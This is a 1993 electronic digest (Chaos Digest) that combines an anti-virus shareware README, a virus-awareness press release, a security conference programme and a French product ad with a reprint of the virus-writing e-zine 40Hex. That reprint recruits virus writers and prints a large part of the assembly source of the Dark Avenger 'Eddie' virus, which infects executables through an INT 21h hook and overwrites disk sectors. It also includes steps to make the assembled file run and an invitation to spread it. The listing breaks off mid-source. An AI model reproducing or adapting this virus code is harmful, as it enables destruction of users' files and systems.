> User           p1@CyberStore.ca         | first.
> Security       Canada V7K 2G6           |
+++++

                           ANNEXE: README.VIR


Hello !
        Hello !
                Hello !

      *************************************************
      * The TRAMIEL FAN CLUB proudly presents you its *
      * "virus buster", designed to solve many little *
      * problems,  generally caused  by nasty  people *
      *************************************************

  This ANTI-VIRUS is especially designed to help you to know what kind
of boot you got on your disks. It may either be a loader, a virus, or an
anti-virus bootsector.

  Furthermore, we also supply one of the biggest bootsector databases you
can see down here. If you have used so far the famous "virus-killer", then...

                            *DON'T PANIC !!!*

this megatool allows you to recover your old bootbase, by melting it with the
one which is supplied in this package...

                   ...KEEP BUSTING with CHASSEUR II !!!

                                   -=o=-

  This is a SHAREWARE program; if you're happy to live from now, you
can show your appreciation by sending us your devotions :

        US $ 15.00    (or equivalent, ou 50,00 Francs francais de France ! )

  ... to the following address :

                       +-----------------------+
                       |    A. & Z. VIDOVIC    |
                       |    Tour Panoramique   |
                       |    DUCHERE            |
                       |    69009 LYON         |
                       |    FRANCE             |
                       +-----------------------+

... If you want, we will then send you the commented source-code for this
New-Generation Hunter (100% pure Motorola 68000 Assembler)...

                                   -=o=-

( You can also send us your bug reports, or suggestions,
without feeling compelled to buy it, of course ! )

Note: we didn't wrote any documentation for using this, since we think it is
      already well-enough easy to use it (GEM, MOUSE, FORM/DIALOG BOXES).

Question: Do you think we will get enough money with this to buy a
          bock of beer to each of us, even if it is this disgusting
          VALSTAR beer (one said to me that CASINO beer is even worse, but
          I can't seriously believe it) ?

------------------------------

Date: Wed May 19 19:35:38 EDT 1993
From: ae446@freenet.carleton.ca (Nigel Allen )
Subject: File 2--National Computer Virus Awareness Day, USA (fete nationale)


PRESS RELEASE
From: National Computer Security Association.
To: Business Desk, Computer Writer

       National Computer Virus Awareness Day to Showcase Virus Threat,
                Urge Protection for U.S. "Information Highway"

 Contact: Larry Teien of 3M, St. Paul,
          612-736-5961, or
          Robert Bales of the National Computer Security Association,
          Carlisle, Pa., 717-258-1816, or
          Ken Greenberg of Fleishman-Hillard Inc., Los Angeles,
          213-629-4974

     WASHINGTON, May 19  -- Moving the computer virus control battleground
from the private sector to the public sphere, 3M and the National Computer
Security Association (NCSA) will jointly host the first National Computer
Virus Awareness Day in Washington on June 9 -- encouraging federal protection
of the Clinton administration's proposed "data superhighway."

     National Computer Virus Awareness Day will serve as the focal point of a
multi-tiered Capitol Hill public education campaign.  Activities will include
a June 9 briefing to Congress about the virus threat and recommended remedial
action, along with an informational Hill virus control exhibit on June 9-10.
Rep. Edward Markey (D-Mass.)  is also expected to convene hearings on
information security during that week.

     "As the nation moves to build the proposed `data superhighway,'
information security must be the first pillar," said Robert Bales, executive
director, NCSA, a Carlisle, Pa., organization dedicated to increasing
awareness about data security issues.

     "For the sake of national competitiveness, NCSA has long advocated that
companies establish effective in-house computer virus policies that will
educate employees and equip them with protective measures," he said.  "Now,
with 3M and others, we're working with lawmakers to establish an appropriate
federal response to virus propagation."

     As a media manufacturer with a major investment in the integrity of its
products, 3M views education as basic to virus prevention, according to
Virginia Hockett, information technology manager, 3M Memory Technologies
Group, St. Paul, Minn.

     "Responsible computing requires that users be aware of the simple means
of protection at their disposal," Hockett said.  "This also means that media
manufacturers -- and, for that matter, all major players in the computer
industry -- have a responsibility to adopt, enforce and advocate safe
computing practices.

     "The value of any information highway could well be wrecked without both
virus education and effective virus control legislation."

     Congress to Probe Issue

     During the week of June 7, Markey, chairman of the House Telecommuni-
cations and Finance Subcommittee of the Energy and Commerce Committee, is
expected to hold hearings on information security.  Markey will be seeking
public comment on possible anti-virus legislation, with an eye toward the
"data superhighway" bill championed by Vice President Al Gore.

     National Computer Virus Awareness Day comes in part as a response
to a recent NCSA/Dataquest study, which revealed that 63 percent of
corporations surveyed had battled a computer virus.  NCSA reports that dozens
of new virus strains are discovered every month.  The June 9 event has been
endorsed by an array of companies and professional organizations.

     Concurrent with National Computer Virus Awareness Day is NCSA's
InfoSecurity Expo, a conference for information security professionals, which
will be held at a nearby Capitol Hill hotel. During the conference, attendees
will be canvassed on the proper federal role in virus education and
prevention. Findings will be presented to Congress and the Administration.

     Founded in 1989, NCSA is an independent organization to help users
improve the security of their information systems, ensure the integrity of
their information resources and reduce the threat of computer viruses.

     3M is the world's leading supplier of flexible magnetic recording media.


   Editors: For more information about the NCSA/Dataquest study, please
contact
the NCSA at 717-258-1816.
--
Nigel Allen, Toronto, Ontario, Canada  ae446@freenet.carleton.ca

------------------------------

Date: Mon, 3 May 1993 18:33:16 +0200
From: brunnstein@rz.informatik.uni-hamburg.dbp.de
Subject: File 3--Security&Control of IT in Society_ 12-7 Aout 93 (conference)
Repost from: RISKS Digest #14.60.6


       SECURITY AND CONTROL OF INFORMATION TECHNOLOGY IN SOCIETY
       An IFIP WG 9.6 Working Conference to explore the issues:
                          August 12 - 17, 1993

Venue: the conference ship M/S Ilich between Stockholm and St.Petersburg

Dependence on information technology (IT) is widespread. IT is used for the
option and control of a range of social, industrial, commercial, governmental
and regulatory processes, yet it introduces new potential threats to personal
privacy and freedom, and new opportunities for criminal activity.  These
dangers have to be countered and controlled in a manner that balances the
benefits of IT. Therefore careful consideration has to be given to determine
what constitutes the most effective control and regulation of IT.  Such topics
should be high on national agendas.

IFIP's Working Group on Information Technology Misuse and the Law (WG 9.6) is
holding a working conference to explore these issues, from 12 to 17 August,
aboard the conference ship M/S Ilich between Stockholm and St.Petersburg. On
the Saturday of the conference week the conference will convene in St.-
Petersburg for meetings with Russian representatives, providing a valuable
opportunity to discuss some of the problems of IT in an emerging capitalist
economy.

The conference, Security and Control of Information Technology, will explore
major issues, including particular reference to Eastern European Economies.
The organisers are keen to attract people representing a wide range of
interests, including central government, regulatory bodies, information system
users, relevant public interest groups, the legal profession, and academics.
Participants from all parts of Europe and beyond will be welcome. In addition
to full conference papers there will be discussion groups and shorter
presentations.

Eur. Ing. Richard Sizer (UK), chairman of WG 9.6, is conference chairman, Dr.
Louise Yngstrom (Sweden) is in charge of local organisation and Prof. Martin
Wasik is chairman of the International Programme Committee.  The proceedings
will be published by Elsevier North Holland and edited by Ing. Sizer, Prof. M.
Wasik and Prof. R. Kaspersen (Netherlands).

Those desiring  to  attend  the  conference  and  requiring  further
information may contact Prof. Wasik at:

    Faculty of  Law, Manchester  University, Manchester  M13 9PL,  U.K.,
    Tel. +44 61 275 3594, Fax +44 61 275 3579.

or for local arrangements, contact Ann-Marie Bodor at:

    Dept of  Computer ans  Systems Sciences,  Stockholm  University/KTH,
    Electrum 230, Sweden, Tel +46 8 162000, Fax +46 8 7039025.


                        CONFERENCE PROGRAMME

Thursday Evening, August 12
+---------------------------

Opening presentation: "The law cannot help"

A debate led by K.Brunnstein (Germany) and R.Kaspersen (Netherlands)
Chairman: Eur. Ing. Richard Sizer (U.K.)


Friday, August 13
+-------------------------
Morning:
Paper 1: "Privacy and Computing: a Cultural Perspective"
         R.Lundheim, G.Sindre (Norway)

Paper 2: "Is International Law on Security of Information Systems Emerging ?"
         B.Spruyt, B.de Schutter (Belgium)

Paper 3: "On the cutting edge between Privacy and Security"
         J.Holvast, R.Ketelaar (Netherlands), S.Fischer-Huebner (Germany)

Paper 4: "Protection of the Information of Organisations in the
         Asia-Pacific region", M.Jackson (Australia)

Afternoon: Two Discussion Streams
Stream 1: International cultural perspectives on IT, privacy and security
          (led by J.Holvast)

Stream 2: Priorities for IT in emerging economies (led by R.Kaspersen)


Saturday August 14
+------------------

* Part I:  "IT and Security in Russia. Experts view"

"IT and Security in Russia", E.V. Evtyushin (Russ. Agency for New Information)

"IT vs. Security in Russia", E.A. Musaev (Russian Academy of Sciences)

"Problems of information protection in the Northwestern region of Russia"
P.A. Kuznetsov (Association for Information Protection)

* Part II: "IT and Security in Russia - Commercial sector"

TBD (Sberbank of Russia), TBD (St Petersburg Chamber of Commerce)

* Part III: "It and Security in Russia - Public Sector"

TBD (Public Sector)

* Part IV: "Western Developments in IT-Security"

R.Hackworth (U.K.): "The OECD Guidelines on IT Security"
M.Abrams (USA): "From Orange Book to new US Criteria"
P.White (U.K.): "Drafting Security Policies"
TBD "INFOSEC Security Issues in the EC"


Sunday August 15: Tour of St.Petersburg
+---------------------------------------


Monday, August 16
+-----------------

Morning:
Paper 5: "Recent development in IT security evaluation"
         K.Rannenberg (Germany)

Paper 6: "On the formal specification of security requirements"
         A.Jones, M.Sergot (Norway)

Paper 7: "Symbiosis of IT security standards"
         M.Abrams (USA)

Paper 8: "An Academic Programme for IT Security"
         L.Yngstrom (Sweden)

Afternoon: Two workshops based on:
* Workshop 1:

Paper 9: "Are US Computer Crime Laws Adequate ?"
         L.Young (USA)

Paper 10:"Computer Crime in Slovakia ?"
         J.Dragonev, J.Vyskoc (Slovakia)

Paper 11:"Computer Crime Coroners for an IT Society"
         S.Kowalski (Sweden)

* Workshop 2:

Paper 12:"Computer supported security intelligence"
         I.Orci (Sweden)

Paper 13:"Design for security functions of chipcard software"
         K.Dippel (Germany)

Paper 14: "Court ordered wiretapping in USA"
         G.Turner (USA)


CLOSING DISCUSSION AND CONCLUSIONS, Chairman: R.Sizer (U.K)

(TBD: Speakers to be decided. Details of conference sessions are
subject to change)

The costs of attending the conference are now set as follows:

  One delegate: 4175 Swedish Krona
  Two delegates sharing one cabin: 3275 Swedish Krona (per person)
  Accompanying person: 3175 Swedish Krona (no conference proceedings)

These prices include accommodation, all meals on board of the M/S Ilich and
while in St.Petersburg, an excursion on Sunday and, for delegates, a copy of
all conference papers. Cabins on the ship each have a window and a shower.

Cheques or money orders (in Swedish Krona) should be made payable to the
account: "Foriningen for Sakerhetsinformatik: IFIP WG 9.6" and sent as soon as
possible and, in any event, not later than June 11, to:

  Ann-Marie Bodor, Dept. of Computer and Systems Sciences
  Stockholm University/KTH, Electrum 230, S-164 40 Kista, Sweden

All registrations are responsible for making their own arrangements for travel
to and from Stockholm, and for their visas and insurance.  Registrations most
probably cannot be accepted after June 11 due to the booking deadline for the
cabins on board.

------------------------------

Date: Sat, 15 May 93 05:02 EDT
From: NDURAND@cipcinsa.insa-lyon.fr (Nicolas Durand )
Subject: File 4--S.A.M., le prochain bebe de France TELECOM (produit)


              METTEZ VOTRE MINITEL ET VOTRE CORRESPONDANCE
                          DANS VOTRE MICRO !

S.A.M. est le premier logiciel pour micro-ordinateur qui vous permet
d'utiliser directement tous les services de communication de FRANCE TELECOM
(services du Minitel, telecopie, telex, telephone, messageries profession-
nelles, transfert de fichiers...).

     Il est destine a tous les professionnels disposant d'un micro-ordinateur
PC ou Macintosh equipe d'une carte ou d'un boitier modem.

     Par exemple : vous venez de preparer un document sur votre traitement
de texte: avec S.A.M., rien de plus simple que de l'envoyer par telecopie, par
telex ou par messagerie electronique a tous vos destinataires. Vous pouvez
meme le diffuser sous forme de lettre a l'adresse postale d'un ou plusieurs
destinataires (diffusion jusqu'a 250 destinataires par envoi) !

     Vous consultez tous les jours les cours de la Bourse par Minitel : avec
S.A.M., rien de plus simple que d'enregistrer cette consultation sur votre
micro. Votre micro pourra des lors se connecter automatiquement au serveur
Bourse, recuperer les informations qui vous interessent et pourra meme les
traiter si vous le souhaitez !

     Dans votre travail, vous devez quotidiennement vous connecter a des
serveurs de donnees, transferer des fichiers sur ou depuis votre micro : avec
S.A.M., vous disposez de tous les outils necessaires pour ces transferts.

     S.A.M. integre pour vous toutes ces formes de communication dans un
logiciel unique !

     De plus, a chaque communication, votre carnet d'adresses S.A.M. peut
enregistrer les coordonnees de correspondants et les tenir a votre disposition
pour  utilisation ulterieur.

     Tous ces services sont accessibles a partir d'une simple ligne
telephonique. Vous n'avez pas a souscrire d'abonnement

           **************************************************
           ***   DURAND Nicolas.  Your Best Night Mire.   ***
           ***        NDURAND@cicpinsa.insa-lyon.fr       ***
           **************************************************

------------------------------

End of Chaos Digest #1.34
************************************

Chaos Digest             Lundi 24 Mai 1993        Volume 1 : Numero 35
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.35 (24 Mai 1993)
File 1--40H VMag Issue 1 Volume 3 #000-003(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives.  They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 3 #000-003(1) (reprint)


40Hex Issue 3                                                      0000

                                Contents
                                --------

  A Word From Hellraiser.......................................0001
  The Dark Avenger Source......................................0002
  Anthrax......................................................0003
  The 40Hex Challenge/The Strange Case of Validate.............0004
  Application for SKISM........................................0005
  Virus News For October/91....................................0006
  The Darth Vader Virus Strain B...............................0007
  Mystery Virus................................................0008
  Tiny-F Source................................................0009
  Afterwords...................................................0010

                                 Staff
                                 -----

  Hellraiser...............Editor/Writer/Programmer/Tech. Consultant
  Garbage Heap.....................Writer/Spell Checker/Distribution

  Special Thanks to...  Demogorgan, Dark Angel, Count Zero, Piff',
                        Paragon Dude, The Fisch, Gambit, Punisher,
                        Nuclear Warhead, Ironlord (and the rest of
                        the alliance people all our freinds in PA, CT,
                        and all over the world, and most of all our
                        readers for your support.


    SKISM distribution sites as of 10/91

    Jihad                   - 1-(408)-XXX-XXXX : California
    The Night Eyes BBS      - 1-(717)-367-3501 : Pennsylvania
    The Punishment Due BBS  - 1-(203)-675-???? : Connecticut   * DOWN *

+++++

40Hex Issue 3                                                      0001

          - Gray would be the color, if I had a heart.


          Well what's up.  Sorry about the delay with issue three
          but there's been a lot of stuff going down.  I've been
          working on a lot of semi-legit projects and all that so
          I haven't gotten around to 40Hex till now.

          Anyway, first big news is this.  SKISM has now co-oped
          with the New York based group PHALCON, thus broadening
          both groups span of diversity.  SKISM being an all virus
          group and PHALCON dealing with mainly h/p.

          Secondly, SKISM is hoping to broaden its membership a
          bit.  We are looking for a few good virus writers.
          Mainly what we need is some people who are very good
          at assembly code and first and foremost virus writing.
          Lame bomb writers, Q-Basic coders and such need not apply.
          We are not just looking for IBM coders, as we are also
          broading to Mac and Amiga.

          Thirdly, SKISM gained a new HQ in PA., it is called Night
          Eyes BBS.  The number is (717)-367-3501, supporting
          12/24/96/14.4 baud rates.

[ChaosD: DOWN! a ce jour... il semblerait qu'il n'est jamais fonctionne!]

          Finally, The Landfill BBS, whos number is listed as the
          SKISM HQ in issue two, is no longer our HQ.  Although
          we are still on very good terms with the staff of that
          BBS, please refrain from calling it with virus related
          topics (they are no-longer h/p, just Amiga wares).  Any-
          way the new New York SKISM base should be up and running
          by tops October.  It will be called Hell On Earth and I
          myself will be sysop.

          Well enjoy...

          - Hellraiser


                             -- Appendum --

          Well about three days after writing this artical I found out
          that I am being shipped to California.  This sucks...

          Well looks like Hell On Earth will be up out there instead of
          New York.

          Call our home boards to keep in touch with the situation.  I
          can still be left mail on Night Eyes.


                            -- Appendum B --
                                10/25/91

          Well, it's been over a month since I wrote the above.  Nothing
          much has changed since then.  I'm in CA. now and without a
          system.  Phalcon members have been going off -- mostly Dark Angel,
          who has a new virus coming out, Bob Ross.  I hope I can get it
          for this issue.

          Anyway, in other news The Punishment Due - Skism distribution
          site has gone down.  I am looking for other BBS's to add the
          collection to.

          More news... There is another Hell On Earth BBS out there so
          it looks like I am going to have to change the name of my
          BBS, when I get my system.  Ironically I am concidering having
          the other Hell On Earth as a Skism distribution site.

          Even more news...  I have been getting a lot of shit cause
          of my name.  There seems to be other Hellraisers out there,
          who claim they were the first... Fuck you all!  I had the name
          since 1989, when I read Clive Barkers novella - "The Hellbound
          Heart."  If you had it before then, its yours.  However after
          calling a lot of boards nationally lately I never had a problem
          logging on due to my name.  Shows how lame people are.

          Well thats it for now... Hope this issue will be out shortly.

+++++

40Hex Issue 3                                                      0002

                            The Dark Avenger

    - We are demons to some, angels to others.

    Well, here it is.  Here is the first major virus source, from the
    man who brought us such greats as V2000, Anthrax, and V2100 to name
    a few.  Well this Bulgarian metal lover was nice enough to freely
    distribute the source code to his first virus.

-----------------------------------------------------------------------------

;"Blessed is he who expects nothing, for he shall not be disappointed."

;The original source of one of the first Bulgarian viruses is in front of
;you.  As you may notice, it's full of rubbish and bugs, but nevertheless
;the virus has spread surprisingly quickly troughout the country and made a
;quick round the globe.  (It's well-known in Eastern and Western Europe, as
;well as in USA.) Due to the aniversary of its creation, the source is
;distributed freely.  You have the rights to distribute the source which can
;be charged or free of charge, with the only condition not to modify it.
;The one, who intentionaly distributes this source modified in any way will
;be punished!  Still, the author will be glad if any of you improves it and
;spreads the resulting executive file (i.e., the virus itself).  Pay
;attention to the fact that after you assemble the source, the resulting
;.COM-file cannot be run.  For that purpose you have to create a three-byte
;file, consisting of the hex numbers 0e9h, 68h, 0 and then to combine the
;two files.  Don't try to place a JMP at the beginning of the source.

;DISCLAIMER: The author does not take any responsability for any damage,
;either direct or implied, caused by the usage or not of this source or of
;the resulting code after assembly. No warrant is made about the product
;functionability or quality.

;I cannot resist to express my special gratitude to my "populazer" Dipl.
;eng. Vesselin Bontchev, who makes me famous and who, wishing it or
;not, helps very much in the spreading of my viruses, in spite of the fact
;that he tries to do just the opposite (writing programs in C has never
;led to any good).
;Greetings to all virus writers!

code    segment
        assume  cs:code,ds:code
copyright:
        db      'Eddie lives...somewhere in time!',0
date_stamp:
        dd      12239000h
checksum:
        db      30

;Return the control to an .EXE file:
;Restores DS=ES=PSP, loads SS:SP and CS:IP.

exit_exe:
        mov     bx,es
        add     bx,10h
        add     bx,word ptr cs:[si+call_adr+2]
        mov     word ptr cs:[si+patch+2],bx
        mov     bx,word ptr cs:[si+call_adr]
        mov     word ptr cs:[si+patch],bx
        mov     bx,es
        add     bx,10h
        add     bx,word ptr cs:[si+stack_pointer+2]
        mov     ss,bx
        mov     sp,word ptr cs:[si+stack_pointer]
        db      0eah                    ;JMP XXXX:YYYY
patch:
        dd      0

;Returns control to a .COM file:
;Restores the first 3 bytes in the
;beginning of the file, loads SP and IP.

exit_com:

        mov     di,100h
        add     si,offset my_save
        movsb
        movsw
        mov     sp,ds:[6]               ;This is incorrect
        xor     bx,bx
        push    bx
        jmp     [si-11]                 ;si+call_adr-top_file

;Program entry point

startup:
        call    relative
relative:
        pop     si                      ;SI = $
        sub     si,offset relative
        cld
        cmp     word ptr cs:[si+my_save],5a4dh
        je      exe_ok
        cli
        mov     sp,si                   ;A separate stack is supported for
        add     sp,offset top_file+100h ;the .COM files, in order not to
        sti                             ;overlap the stack by the program
        cmp     sp,ds:[6]
        jnc     exit_com
exe_ok:
        push    ax
        push    es
        push    si
        push    ds
        mov     di,si

;Looking for the address of INT 13h handler in ROM-BIOS

        xor     ax,ax
        push    ax
        mov     ds,ax
        les     ax,ds:[13h*4]
        mov     word ptr cs:[si+fdisk],ax
        mov     word ptr cs:[si+fdisk+2],es
        mov     word ptr cs:[si+disk],ax
        mov     word ptr cs:[si+disk+2],es
        mov     ax,ds:[40h*4+2]         ;The INT 13h vector is moved to INT
40h
        cmp     ax,0f000h               ;for diskettes if a hard disk is
        jne     nofdisk                 ;available
        mov     word ptr cs:[si+disk+2],ax
        mov     ax,ds:[40h*4]
        mov     word ptr cs:[si+disk],ax
        mov     dl,80h
        mov     ax,ds:[41h*4+2]         ;INT 41h usually points the segment,
        cmp     ax,0f000h               ;where the original INT 13h vector is
        je      isfdisk
        cmp     ah,0c8h
        jc      nofdisk
        cmp     ah,0f4h
        jnc     nofdisk
        test    al,7fh
        jnz     nofdisk
        mov     ds,ax
        cmp     ds:[0],0aa55h
        jne     nofdisk
        mov     dl,ds:[2]
isfdisk:
        mov     ds,ax
        xor     dh,dh
        mov     cl,9
        shl     dx,cl
        mov     cx,dx
        xor     si,si
findvect:
        lodsw                           ;Occasionally begins with:
        cmp     ax,0fa80h               ;       CMP     DL,80h
        jne     altchk                  ;       JNC     somewhere
        lodsw
        cmp     ax,7380h
        je      intchk
        jne     nxt0
altchk:
        cmp     ax,0c2f6h               ;or with:
        jne     nxt                     ;       TEST    DL,80h
        lodsw                           ;       JNZ     somewhere
        cmp     ax,7580h
        jne     nxt0
intchk:
        inc     si                      ;then there is:
        lodsw                           ;       INT     40h
        cmp     ax,40cdh
        je      found
        sub     si,3
nxt0:
        dec     si
        dec     si
nxt:
        dec     si
        loop    findvect
        jmp     short nofdisk
found:
        sub     si,7
        mov     word ptr cs:[di+fdisk],si
        mov     word ptr cs:[di+fdisk+2],ds
nofdisk:
        mov     si,di
        pop     ds

;Check whether the program is present in memory:

        les     ax,ds:[21h*4]
        mov     word ptr cs:[si+save_int_21],ax
        mov     word ptr cs:[si+save_int_21+2],es
        push    cs
        pop     ds
        cmp     ax,offset int_21
        jne     bad_func
        xor     di,di
        mov     cx,offset my_size
scan_func:
        lodsb
        scasb
        jne     bad_func
        loop    scan_func
        pop     es
        jmp     go_program

;Move the program to the top of memory:
;(it's full of rubbish and bugs here)

bad_func:
        pop     es
        mov     ah,49h
        int     21h
        mov     bx,0ffffh
        mov     ah,48h
        int     21h
        sub     bx,(top_bz+my_bz+1ch-1)/16+2
        jc      go_program
        mov     cx,es
        stc
        adc     cx,bx
        mov     ah,4ah
        int     21h
        mov     bx,(offset top_bz+offset my_bz+1ch-1)/16+1
        stc
        sbb     es:[2],bx
        push    es
        mov     es,cx
        mov     ah,4ah
        int     21h
        mov     ax,es
        dec     ax
        mov     ds,ax
        mov     word ptr ds:[1],8
        call    mul_16
        mov     bx,ax
        mov     cx,dx
        pop     ds
        mov     ax,ds
        call    mul_16
        add     ax,ds:[6]
        adc     dx,0
        sub     ax,bx
        sbb     dx,cx
        jc      mem_ok
        sub     ds:[6],ax               ;Reduction of the segment size
mem_ok:
        pop     si
        push    si
        push    ds
        push    cs
        xor     di,di
        mov     ds,di
        lds     ax,ds:[27h*4]
        mov     word ptr cs:[si+save_int_27],ax
        mov     word ptr cs:[si+save_int_27+2],ds
        pop     ds
        mov     cx,offset aux_size
        rep     movsb
        xor     ax,ax
        mov     ds,ax
        mov     ds:[21h*4],offset int_21;Intercept INT 21h and INT 27h
        mov     ds:[21h*4+2],es
        mov     ds:[27h*4],offset int_27
        mov     ds:[27h*4+2],es
        mov     word ptr es:[filehndl],ax
        pop     es
go_program:
        pop     si

;Smash the next disk sector:

        xor     ax,ax
        mov     ds,ax
        mov     ax,ds:[13h*4]
        mov     word ptr cs:[si+save_int_13],ax
        mov     ax,ds:[13h*4+2]
        mov     word ptr cs:[si+save_int_13+2],ax
        mov     ds:[13h*4],offset int_13
        add     ds:[13h*4],si
        mov     ds:[13h*4+2],cs
        pop     ds
        push    ds
        push    si
        mov     bx,si
        lds     ax,ds:[2ah]
        xor     si,si
        mov     dx,si
scan_envir:                             ;Fetch program's name
        lodsw                           ;(with DOS 2.x it doesn't work anyway)
        dec     si
        test    ax,ax
        jnz     scan_envir
        add     si,3
        lodsb

;The following instruction is a complete nonsense.  Try to enter a drive &
;directory path in lowercase, then run an infected program from there.
;As a result of an error here + an error in DOS the next sector is not
;smashed. Two memory bytes are smashed instead, most probably onto the
;infected program.

        sub     al,'A'
        mov     cx,1
        push    cs
        pop     ds
        add     bx,offset int_27
        push    ax
        push    bx
        push    cx
        int     25h
        pop     ax
        pop     cx
        pop     bx
        inc     byte ptr [bx+0ah]
        and     byte ptr [bx+0ah],0fh   ;It seems that 15 times doing
        jnz     store_sec               ;nothing is not enough for some.
        mov     al,[bx+10h]
        xor     ah,ah
        mul     word ptr [bx+16h]
        add     ax,[bx+0eh]
        push    ax
        mov     ax,[bx+11h]
        mov     dx,32
        mul     dx
        div     word ptr [bx+0bh]
        pop     dx
        add     dx,ax
        mov     ax,[bx+8]
        add     ax,40h
        cmp     ax,[bx+13h]
        jc      store_new
        inc     ax
        and     ax,3fh
        add     ax,dx
        cmp     ax,[bx+13h]
        jnc     small_disk
store_new:
        mov     [bx+8],ax
store_sec:
        pop     ax
        xor     dx,dx
        push    ax
        push    bx
        push    cx
        int     26h

;The writing trough this interrupt is not the smartest thing, bacause it
;can be intercepted (what Vesselin Bontchev has managed to notice).

        pop     ax
        pop     cx
        pop     bx
        pop     ax
        cmp     byte ptr [bx+0ah],0
        jne     not_now
        mov     dx,[bx+8]
        pop     bx
        push    bx
        int     26h
small_disk:
        pop     ax
not_now:
        pop     si
        xor     ax,ax
        mov     ds,ax
        mov     ax,word ptr cs:[si+save_int_13]
        mov     ds:[13h*4],ax
        mov     ax,word ptr cs:[si+save_int_13+2]
        mov     ds:[13h*4+2],ax
        pop     ds
        pop     ax
        cmp     word ptr cs:[si+my_save],5a4dh
        jne     go_exit_com
        jmp     exit_exe
go_exit_com:
        jmp     exit_com
int_24:
        mov     al,3                    ;This instruction seems unnecessary
        iret

;INT 27h handler (this is necessary)

int_27:
        pushf
        call    alloc
        popf
        jmp     dword ptr cs:[save_int_27]

;During the DOS functions Set & Get Vector it seems that the virus has not
;intercepted them (this is a doubtfull advantage and it is a possible
;source of errors with some "intelligent" programs)

set_int_27:
        mov     word ptr cs:[save_int_27],dx
        mov     word ptr cs:[save_int_27+2],ds
        popf
        iret
set_int_21:
        mov     word ptr cs:[save_int_21],dx
        mov     word ptr cs:[save_int_21+2],ds
        popf
        iret
get_int_27:
        les     bx,dword ptr cs:[save_int_27]
        popf
        iret
get_int_21:
        les     bx,dword ptr cs:[save_int_21]
        popf
        iret

exec:
        call    do_file
        call    alloc
        popf
        jmp     dword ptr cs:[save_int_21]

        db      'Diana P.',0

;INT 21h handler.  Infects files during execution, copying, browsing or
;creating and some other operations. The execution of functions 0 and 26h
;has bad consequences.

int_21:
        push    bp
        mov     bp,sp
        push    [bp+6]
        popf
        pop     bp
        pushf
        call    ontop
        cmp     ax,2521h
        je      set_int_21
        cmp     ax,2527h
        je      set_int_27
        cmp     ax,3521h
        je      get_int_21
        cmp     ax,3527h
        je      get_int_27
        cld
        cmp     ax,4b00h
        je      exec
        cmp     ah,3ch
        je      create
        cmp     ah,3eh
        je      close
        cmp     ah,5bh
        jne     not_create
create:
        cmp     word ptr cs:[filehndl],0;May be 0 if the file is open
        jne     dont_touch
        call    see_name
        jnz     dont_touch
        call    alloc
        popf
        call    function
        jc      int_exit
        pushf
        push    es
        push    cs
        pop     es
        push    si
        push    di
        push    cx
        push    ax
        mov     di,offset filehndl
        stosw
        mov     si,dx
        mov     cx,65
move_name:
        lodsb
        stosb
        test    al,al
        jz      all_ok
        loop    move_name
        mov     word ptr es:[filehndl],cx
all_ok:
        pop     ax
        pop     cx
        pop     di
        pop     si
        pop     es
go_exit:
        popf
        jnc     int_exit                ;JMP
close:
        cmp     bx,word ptr cs:[filehndl]
        jne     dont_touch
        test    bx,bx
        jz      dont_touch
        call    alloc
        popf
        call    function
        jc      int_exit
        pushf
        push    ds
        push    cs
        pop     ds
        push    dx
        mov     dx,offset filehndl+2
        call    do_file
        mov     word ptr cs:[filehndl],0
        pop     dx
        pop     ds
        jmp     go_exit
not_create:
        cmp     ah,3dh
        je      touch
        cmp     ah,43h
        je      touch
        cmp     ah,56h                  ;Unfortunately, the command inter-
        jne     dont_touch              ;preter does not use this function
touch:
        call    see_name
        jnz     dont_touch
        call    do_file
dont_touch:
        call    alloc
        popf
        call    function
int_exit:
        pushf
        push    ds
        call    get_chain
        mov     byte ptr ds:[0],'Z'
        pop     ds
        popf
dummy   proc    far                     ;???
        ret     2
dummy   endp

;Checks whether the file is .COM or .EXE.
;It is not called upon file execution.

see_name:
        push    ax
        push    si
        mov     si,dx
scan_name:
        lodsb
        test    al,al
        jz      bad_name
        cmp     al,'.'
        jnz     scan_name
        call    get_byte
        mov     ah,al
        call    get_byte
        cmp     ax,'co'
        jz      pos_com
        cmp     ax,'ex'
        jnz     good_name
        call    get_byte
        cmp     al,'e'
        jmp     short good_name
pos_com:
        call    get_byte
        cmp     al,'m'
        jmp     short good_name
bad_name:
        inc     al
good_name:
        pop     si
        pop     ax
        ret

;Converts into lowercase (the subroutines are a great thing).

get_byte:
        lodsb
        cmp     al,'C'
        jc      byte_got
        cmp     al,'Y'
        jnc     byte_got
        add     al,20h
byte_got:
        ret

;Calls the original INT 21h.

function:
        pushf
        call    dword ptr cs:[save_int_21]
        ret

